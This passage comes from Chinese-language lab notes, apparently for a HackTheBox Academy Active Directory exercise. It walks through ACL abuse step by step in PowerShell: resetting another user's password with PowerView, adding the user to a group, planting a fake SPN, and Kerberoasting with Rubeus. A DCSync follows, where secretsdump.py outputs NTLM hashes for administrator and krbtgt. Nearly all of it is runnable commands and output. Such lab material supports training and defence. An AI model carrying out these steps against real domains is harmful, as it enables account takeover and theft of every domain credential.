ObjectAceTypePresent</span><br><span class="line">IsCallback             : False</span><br><span class="line">PropagationFlags       : None</span><br><span class="line">SecurityIdentifier     : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1164</span></span><br><span class="line">AccessMask             : <span class="number">256</span></span><br><span class="line">AuditFlags             : None</span><br><span class="line">IsInherited            : False</span><br><span class="line">AceFlags               : ContainerInherit</span><br><span class="line">InheritedObjectAceType : All</span><br><span class="line">OpaqueLength           : <span class="number">0</span></span><br><span class="line"></span><br><span class="line">AceQualifier           : AccessAllowed</span><br><span class="line">ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights  : ExtendedRight</span><br><span class="line">ObjectAceType          : DS<span class="literal">-Replication-Get-Changes</span></span><br><span class="line">ObjectSID              : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114</span></span><br><span class="line">InheritanceFlags       : ContainerInherit</span><br><span class="line">BinaryLength           : <span class="number">56</span></span><br><span class="line">AceType                : AccessAllowedObject</span><br><span class="line">ObjectAceFlags         : ObjectAceTypePresent</span><br><span class="line">IsCallback             : False</span><br><span class="line">PropagationFlags       : None</span><br><span class="line">SecurityIdentifier     : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1164</span></span><br><span class="line">AccessMask             : <span class="number">256</span></span><br><span class="line">AuditFlags             : None</span><br><span class="line">IsInherited            : False</span><br><span class="line">AceFlags               : ContainerInherit</span><br><span class="line">InheritedObjectAceType : All</span><br><span class="line">OpaqueLength           : <span class="number">0</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="ACL-滥用策略"><a href="#ACL-滥用策略" class="headerlink" title="ACL 滥用策略"></a>ACL 滥用策略</h2><h3 id="创建-PSCredential-对象"><a href="#创建-PSCredential-对象" class="headerlink" title="创建 PSCredential 对象"></a>创建 PSCredential 对象</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;&lt;PASSWORD HERE&gt;&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;INLANEFREIGHT\wley&#x27;</span>, <span class="variable">$SecPassword</span>)</span><br></pre></td></tr></table></figure>

<h3 id="创建一个-SecureString-对象"><a href="#创建一个-SecureString-对象" class="headerlink" title="创建一个 SecureString 对象"></a>创建一个 SecureString 对象</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="variable">$damundsenPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;Pwn3d_by_ACLs!&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>

<h3 id="更改用户密码"><a href="#更改用户密码" class="headerlink" title="更改用户密码"></a>更改用户密码</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">cd</span> C:\Tools\</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Set-DomainUserPassword</span> <span class="literal">-Identity</span> damundsen <span class="literal">-AccountPassword</span> <span class="variable">$damundsenPassword</span> <span class="literal">-Credential</span> <span class="variable">$Cred</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">VERBOSE: [<span class="built_in">Get-PrincipalContext</span>] <span class="keyword">Using</span> alternate credentials</span><br><span class="line">VERBOSE: [<span class="built_in">Set-DomainUserPassword</span>] Attempting to <span class="built_in">set</span> the password <span class="keyword">for</span> user <span class="string">&#x27;damundsen&#x27;</span></span><br><span class="line">VERBOSE: [<span class="built_in">Set-DomainUserPassword</span>] Password <span class="keyword">for</span> user <span class="string">&#x27;damundsen&#x27;</span> successfully reset</span><br></pre></td></tr></table></figure>

<h3 id="使用-damundsen-创建-SecureString-对象"><a href="#使用-damundsen-创建-SecureString-对象" class="headerlink" title="使用 damundsen 创建 SecureString 对象"></a>使用 damundsen 创建 SecureString 对象</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;Pwn3d_by_ACLs!&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="variable">$Cred2</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;INLANEFREIGHT\damundsen&#x27;</span>, <span class="variable">$SecPassword</span>) </span><br></pre></td></tr></table></figure>

<h3 id="将-damundsen-添加到Help-Desk-Level-1-Group"><a href="#将-damundsen-添加到Help-Desk-Level-1-Group" class="headerlink" title="将 damundsen 添加到Help Desk Level 1 Group"></a>将 damundsen 添加到Help Desk Level 1 Group</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-ADGroup</span> <span class="literal">-Identity</span> <span class="string">&quot;Help Desk Level 1&quot;</span> <span class="literal">-Properties</span> * | <span class="built_in">Select</span> <span class="literal">-ExpandProperty</span> Members</span><br><span class="line"></span><br><span class="line">CN=Stella Blagg,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Marie Wright,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Jerrell Metzler,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Evelyn Mailloux,OU=Operations,OU=Logistics<span class="literal">-HK</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Juanita Marrero,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Joseph Miller,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Wilma Funk,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Maxie Brooks,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Scott Pilcher,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Orval Wong,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=David Werner,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Alicia Medlin,OU=Operations,OU=Logistics<span class="literal">-HK</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Lynda Bryant,OU=Operations,OU=Logistics<span class="literal">-HK</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Tyler Traver,OU=Operations,OU=Logistics<span class="literal">-HK</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Maurice Duley,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=William Struck,OU=Operations,OU=Logistics<span class="literal">-HK</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Denis Rogers,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Billy Bonds,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Gladys Link,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Gladys Brooks,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Margaret Hanes,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Michael Hick,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Timothy Brown,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Nancy Johansen,OU=Operations,OU=Logistics<span class="literal">-HK</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Valerie Mcqueen,OU=Operations,OU=Logistics<span class="literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Add-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&#x27;Help Desk Level 1&#x27;</span> <span class="literal">-Members</span> <span class="string">&#x27;damundsen&#x27;</span> <span class="literal">-Credential</span> <span class="variable">$Cred2</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">VERBOSE: [<span class="built_in">Get-PrincipalContext</span>] <span class="keyword">Using</span> alternate credentials</span><br><span class="line">VERBOSE: [<span class="built_in">Add-DomainGroupMember</span>] Adding member <span class="string">&#x27;damundsen&#x27;</span> to <span class="built_in">group</span> <span class="string">&#x27;Help Desk Level 1&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="创建虚假-SPN"><a href="#创建虚假-SPN" class="headerlink" title="创建虚假 SPN"></a>创建虚假 SPN</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Set-DomainObject</span> <span class="literal">-Credential</span> <span class="variable">$Cred2</span> <span class="literal">-Identity</span> adunn <span class="literal">-SET</span> <span class="selector-tag">@</span>&#123;serviceprincipalname=<span class="string">&#x27;notahacker/LEGIT&#x27;</span>&#125; <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">VERBOSE: [<span class="built_in">Get-Domain</span>] <span class="keyword">Using</span> alternate credentials for Get-Domain</span><br><span class="line">VERBOSE: [<span class="built_in">Get-Domain</span>] Extracted domain <span class="string">&#x27;INLANEFREIGHT&#x27;</span> from <span class="literal">-Credential</span></span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainSearcher</span>] search base: LDAP://ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainSearcher</span>] <span class="keyword">Using</span> alternate credentials for LDAP connection</span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainObject</span>] <span class="built_in">Get-DomainObject</span> <span class="keyword">filter</span> string:</span><br><span class="line">(&amp;(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))</span><br><span class="line">VERBOSE: [<span class="built_in">Set-DomainObject</span>] Setting <span class="string">&#x27;serviceprincipalname&#x27;</span> to <span class="string">&#x27;notahacker/LEGIT&#x27;</span> <span class="keyword">for</span> object <span class="string">&#x27;adunn&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="使用-Rubeus-进行-Kerberoasting"><a href="#使用-Rubeus-进行-Kerberoasting" class="headerlink" title="使用 Rubeus 进行 Kerberoasting"></a>使用 Rubeus 进行 Kerberoasting</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\Rubeus.exe kerberoast /user:adunn /nowrap</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line">[*] NOTICE: AES hashes will be returned <span class="keyword">for</span> AES<span class="literal">-enabled</span> accounts.</span><br><span class="line">[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="keyword">for</span> these accounts.</span><br><span class="line"></span><br><span class="line">[*] Target User            : adunn</span><br><span class="line">[*] Target Domain          : INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] Total kerberoastable users : <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : adunn</span><br><span class="line">[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[*] ServicePrincipalName   : notahacker/LEGIT</span><br><span class="line">[*] PwdLastSet             : <span class="number">3</span>/<span class="number">1</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">29</span>:<span class="number">08</span> AM</span><br><span class="line">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span><br><span class="line">[*] Hash                   : <span class="variable">$krb5tgs</span><span class="variable">$23</span><span class="variable">$</span>*adunn<span class="variable">$INLANEFREIGHT</span>.LOCAL<span class="variable">$notahacker</span>/LEGIT@INLANEFREIGHT.LOCAL*<span class="variable">$</span> &lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Cleanup"><a href="#Cleanup" class="headerlink" title="Cleanup"></a>Cleanup</h3><h4 id="从-adunn-的账户中移除伪造的-SPN"><a href="#从-adunn-的账户中移除伪造的-SPN" class="headerlink" title="从 adunn 的账户中移除伪造的 SPN"></a>从 adunn 的账户中移除伪造的 SPN</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Set-DomainObject</span> <span class="literal">-Credential</span> <span class="variable">$Cred2</span> <span class="literal">-Identity</span> adunn <span class="literal">-Clear</span> serviceprincipalname <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">VERBOSE: [<span class="built_in">Get-Domain</span>] <span class="keyword">Using</span> alternate credentials for Get-Domain</span><br><span class="line">VERBOSE: [<span class="built_in">Get-Domain</span>] Extracted domain <span class="string">&#x27;INLANEFREIGHT&#x27;</span> from <span class="literal">-Credential</span></span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainSearcher</span>] search base: LDAP://ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainSearcher</span>] <span class="keyword">Using</span> alternate credentials for LDAP connection</span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainObject</span>] <span class="built_in">Get-DomainObject</span> <span class="keyword">filter</span> string:</span><br><span class="line">(&amp;(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))</span><br><span class="line">VERBOSE: [<span class="built_in">Set-DomainObject</span>] Clearing <span class="string">&#x27;serviceprincipalname&#x27;</span> <span class="keyword">for</span> object <span class="string">&#x27;adunn&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="从-Help-Desk-Level-1-Group中移除-damundsen"><a href="#从-Help-Desk-Level-1-Group中移除-damundsen" class="headerlink" title="从 Help Desk Level 1 Group中移除 damundsen"></a>从 Help Desk Level 1 Group中移除 damundsen</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Remove-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Help Desk Level 1&quot;</span> <span class="literal">-Members</span> <span class="string">&#x27;damundsen&#x27;</span> <span class="literal">-Credential</span> <span class="variable">$Cred2</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">VERBOSE: [<span class="built_in">Get-PrincipalContext</span>] <span class="keyword">Using</span> alternate credentials</span><br><span class="line">VERBOSE: [<span class="built_in">Remove-DomainGroupMember</span>] Removing member <span class="string">&#x27;damundsen&#x27;</span> from <span class="built_in">group</span> <span class="string">&#x27;Help Desk Level 1&#x27;</span></span><br><span class="line">True</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Help Desk Level 1&quot;</span> | <span class="built_in">Select</span> MemberName |? &#123;<span class="variable">$_</span>.MemberName <span class="operator">-eq</span> <span class="string">&#x27;damundsen&#x27;</span>&#125; <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><h3 id="查看-adunn-的组成员身份-Replication权限"><a href="#查看-adunn-的组成员身份-Replication权限" class="headerlink" title="查看 adunn 的组成员身份&#x2F;Replication权限"></a>查看 adunn 的组成员身份&#x2F;Replication权限</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> adunn  |<span class="built_in">select</span> samaccountname,objectsid,memberof,useraccountcontrol |<span class="built_in">fl</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">samaccountname     : adunn</span><br><span class="line">objectsid          : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1164</span></span><br><span class="line">memberof           : &#123;CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar</span><br><span class="line">                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security</span><br><span class="line">                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share <span class="built_in">H</span> Drive,OU=Security</span><br><span class="line">                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...&#125;</span><br><span class="line">useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="variable">$sid</span>= <span class="string">&quot;S-1-5-21-3842939050-3880317879-2865463114-1164&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-ObjectAcl</span> <span class="string">&quot;DC=inlanefreight,DC=local&quot;</span> <span class="literal">-ResolveGUIDs</span> | ? &#123; (<span class="variable">$_</span>.ObjectAceType <span class="operator">-match</span> <span class="string">&#x27;Replication-Get&#x27;</span>)&#125; | ?&#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-match</span> <span class="variable">$sid</span>&#125; |<span class="built_in">select</span> AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | <span class="built_in">fl</span></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-498</span></span><br><span class="line">ObjectAceType         : DS<span class="literal">-Replication-Get-Changes</span></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-516</span></span><br><span class="line">ObjectAceType         : DS<span class="literal">-Replication-Get-Changes-All</span></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1164</span></span><br><span class="line">ObjectAceType         : DS<span class="literal">-Replication-Get-Changes-In-Filtered-Set</span></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1164</span></span><br><span class="line">ObjectAceType         : DS<span class="literal">-Replication-Get-Changes</span></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1164</span></span><br><span class="line">ObjectAceType         : DS<span class="literal">-Replication-Get-Changes-All</span></span><br></pre></td></tr></table></figure>

<h3 id="提取-NTLM-哈希和-Kerberos-密钥"><a href="#提取-NTLM-哈希和-Kerberos-密钥" class="headerlink" title="提取 NTLM 哈希和 Kerberos 密钥"></a>提取 NTLM 哈希和 Kerberos 密钥</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/<span class="type">htb</span>]<span class="variable">$</span> secretsdump.py <span class="literal">-outputfile</span> inlanefreight_hashes <span class="literal">-just-dc</span> INLANEFREIGHT/adunn@<span class="number">172.16</span>.<span class="number">5.5</span> </span><br><span class="line"></span><br><span class="line">Impacket v0.<span class="number">9.23</span> - Copyright <span class="number">2021</span> SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Target system bootKey: <span class="number">0</span>x0e79d2e5d9bad2639da4ef244b30fda5</span><br><span class="line">[*] Searching <span class="keyword">for</span> NTDS.dit</span><br><span class="line">[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a <span class="built_in">copy</span>. This might take some time</span><br><span class="line">[*] <span class="keyword">Using</span> smbexec method for remote execution</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching <span class="keyword">for</span> pekList, be patient</span><br><span class="line">[*] PEK <span class="comment"># 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6</span></span><br><span class="line">[*] Reading and decrypting hashes from \\<span class="number">172.16</span>.<span class="number">5.5</span>\ADMIN<span class="variable">$</span>\Temp\HOLJALFD.tmp </span><br><span class="line">inlanefreight.local\administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">88</span>ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">guest:<span class="number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">lab_adm:<span class="number">1001</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">663715</span>a1a8b957e8e9943cc98ea451b6:::</span><br><span class="line">ACADEMY<span class="literal">-EA-DC01</span><span class="variable">$</span>:<span class="number">1002</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">13673</span>b5b66f699e81b2ebcb63ebdccfb:::</span><br><span class="line">krbtgt:<span class="number">502</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">16</span>e26ba33e455a8c338142af8d89ffbc:::</span><br><span class="line">ACADEMY<span class="literal">-EA-MS01</span><span class="variable">$</span>:<span class="number">1107</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">06</span>c77ee55364bd52559c0db9b1176f7a:::</span><br><span class="line">ACADEMY<span class="literal">-EA-WEB01</span><span 